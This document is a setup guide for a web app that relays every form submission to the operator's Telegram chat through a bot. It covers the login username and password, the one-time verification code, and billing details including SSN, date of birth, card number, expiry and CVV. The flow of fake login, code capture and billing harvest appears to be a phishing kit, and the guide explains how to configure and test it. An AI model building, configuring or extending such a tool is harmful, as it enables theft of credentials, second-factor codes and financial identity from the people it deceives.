# Telegram Bot Integration Guide

This app now includes a Telegram bot function that captures and sends form data from your app to a Telegram chat.

## Setup Instructions

### 1. Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a chat and send `/newbot`
3. Follow the prompts to create a new bot:
   - Choose a name for your bot
   - Choose a username (must end with "bot")
4. BotFather will provide you with a **Bot Token** (looks like: `123456789:ABCdefGHIjklmnOPQRstuvWXYZ`)

### 2. Get Your Chat ID

1. Start a chat with your newly created bot
2. Send any message to the bot
3. Visit this URL in your browser (replace with your bot token):
   ```
   https://api.telegram.org/bot{BOT_TOKEN}/getUpdates
   ```
4. Look for the `"id"` field under the first message object - this is your **Chat ID**

### 3. Configure Environment Variables

1. Open the `.env` file in your project root
2. Add your credentials:
   ```
   VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
   VITE_TELEGRAM_CHAT_ID=your_chat_id_here
   ```

Example:
```
VITE_TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklmnOPQRstuvWXYZ
VITE_TELEGRAM_CHAT_ID=987654321
```

3. Save the file

### 4. Test the Integration

1. Run your app: `npm run dev`
2. Navigate through the login flow and submit the forms
3. Check your Telegram bot's chat - you should receive messages with the form data

## What Data Is Sent to Telegram?

The bot captures and sends:

### Login Page
- Username
- Password (masked)

### Identity Verification
- Selected verification method (Text Message or Phone Call)

### Code Entry
- Verification code entered

### Billing Page
- First Name
- Last Name
- Street Address
- City
- State
- Zip Code
- SSN (last 4 digits visible)
- Date of Birth
- Card Number (last 4 digits visible)
- Expiration Date
- CVV (masked)

## Security Notes

- **Sensitive data is partially masked** in the Telegram messages (passwords, SSN, card numbers, CVV)
- **Keep your `.env` file private** - never commit it to version control
- The `.gitignore` file should already exclude `.env`
- Only share your bot token with trusted systems

## Functions Available

The `telegramBot.js` service provides these functions:

- `sendLoginData(formData)` - Send login credentials
- `sendVerificationData(formData)` - Send identity verification data
- `sendCodeData(formData)` - Send verification code
- `sendBillingData(formData)` - Send billing information
- `sendCustomData(title, data)` - Send custom formatted data
- `sendTelegramMessage(message)` - Send a raw message

## Troubleshooting

### Bot is not receiving messages:
- Verify your Bot Token is correct
- Verify your Chat ID is correct
- Make sure you've sent at least one message to the bot

### Messages are HTML formatted:
- The bot uses `parse_mode: 'HTML'` for bold text formatting using `<b>` tags
- Messages appear bold in Telegram

### Environment variables not loading:
- Make sure the `.env` file is in your project root
- Restart your dev server after editing `.env`
- Variable names must start with `VITE_` to be accessible in the browser

## Additional Resources

- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [BotFather Setup Guide](https://core.telegram.org/bots#6-botfather)
- [Vite Environment Variables](https://vitejs.dev/guide/env-and-modes.html)
